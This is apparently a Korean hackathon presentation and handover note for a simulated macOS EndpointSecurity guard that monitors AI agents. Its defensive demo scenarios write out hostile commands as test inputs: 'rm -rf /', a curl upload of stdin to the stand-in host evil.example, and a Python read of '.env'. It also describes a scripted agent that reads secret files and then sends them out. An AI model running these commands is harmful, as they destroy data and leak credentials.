# OS Guard Simulation Demo

이 문서는 해커톤 발표용 OS Guard 시뮬레이션 범위를 정리한다. README가 아니라 발표/인수인계용 문서로 별도 관리한다.

## 왜 원래 Native 계획이 바로 안 되는가

native OS Guard는 macOS EndpointSecurity의 `AUTH_OPEN`과 `NOTIFY_EXEC`를 사용한다. 이 방식은 실제 파일 open과 process exec를 OS 레벨에서 관측할 수 있지만, 실행 조건이 빡빡하다.

현재 로컬 상태:

```text
security find-identity -v -p codesigning
0 valid identities found
```

문제는 다음과 같다.

- `com.apple.developer.endpoint-security.client`는 Apple restricted entitlement다.
- ad-hoc signing으로 entitlement key를 넣을 수는 있지만, 런타임 검증은 통과하지 못한다.
- 실제 실행 시 macOS AMFI가 `Restricted entitlements not validated`로 daemon을 kill한다.
- 따라서 native demo는 Apple Developer Team, 승인된 EndpointSecurity entitlement, 유효한 signing identity가 준비되어야 한다.

그래서 발표에서는 native 코드를 “구현되어 있고 빌드/테스트 가능하지만 로컬 권한 때문에 실행 검증은 TODO”로 설명하고, 실제 보여주는 화면은 simulation demo를 사용한다.

## 시뮬레이션에서 보여줄 것

실행 명령:

```bash
npm run demo:os-guard
```

시뮬레이션은 실제 커널 차단이 아니다. 대신 EndpointSecurity daemon이 보낼 OS event와 같은 shape을 만들어 기존 policy, audit, vector, state, dashboard pipeline에 태운다.

포함 시나리오:

1. 일반 파일 open 허용
   - `README.md`
   - 기대 결과: `ALLOW`
2. 민감 파일 접근 차단
   - `.404gent/os-guard-demo/.env`
   - 기대 결과: `BLOCK`, `os-sensitive-file-open`
3. private key 접근 차단
   - `.404gent/os-guard-demo/id_rsa`
   - 기대 결과: `BLOCK`, `os-private-key-open`
4. 네트워크 전송 도구 실행 경고
   - `curl https://example.com/upload -d @-`
   - 기대 결과: `WARN`, `os-network-tool-exec`
5. 파괴적 실행 차단
   - `rm -rf /`
   - 기대 결과: `BLOCK`, `os-destructive-exec`
6. Python 우회 설명
   - `python3 -c 'open(".env").read()'`
   - native에서는 언어와 상관없이 같은 `AUTH_OPEN`으로 잡힌다는 모델을 simulated open event로 보여준다.
7. 클라우드 자격증명 접근 차단
   - `.404gent/os-guard-demo/aws_credentials`
   - 기대 결과: `BLOCK`, `os-cloud-credentials-open`
   - 의미: `.env`뿐 아니라 AWS/GCP 같은 클라우드 키 유출도 막는다.
8. 읽기 후 외부 전송 chain
   - `exfil-agent`가 `.env` open 시도
   - 같은 `exfil-agent`가 `curl https://evil.example/upload -d @-` 실행
   - 기대 결과:
     - 1단계: `BLOCK`, `os-sensitive-file-open`
     - 2단계: `WARN`, `os-network-tool-exec`
   - 의미: 민감 파일 접근과 외부 전송 시도를 같은 agent의 연속 사건으로 보여준다.

## 화면에서 보여줄 메시지

dashboard 또는 tower 화면 설명 예시:

```text
Recent Incidents
10:31 exfil-agent BLOCK os-sensitive-file-open
10:31 exfil-agent WARN  os-network-tool-exec

Recommended Action
- Quarantine exfil-agent
- Do not hand off output from exfil-agent
```

발표 멘트:

```text
시뮬레이션은 커널 차단 자체가 아니라 EndpointSecurity event model을 재현한 것입니다.
같은 policy engine, audit log, dashboard pipeline을 사용합니다.

native 모드에서는 이 이벤트가 Apple EndpointSecurity AUTH_OPEN/NOTIFY_EXEC에서 발생하고,
언어가 Node, Python, Go, Rust, C 무엇이든 OS open/exec 경로에서 관측됩니다.
```

## Native TODO

- Apple Developer Program Team 준비
- `com.apple.developer.endpoint-security.client` entitlement 승인
- 유효한 codesigning identity 생성
- ad-hoc signing 제거
- app-like wrapper 또는 System Extension packaging
- 실제 `.env` `AUTH_OPEN` deny smoke
- 실제 `curl` `NOTIFY_EXEC` audit smoke
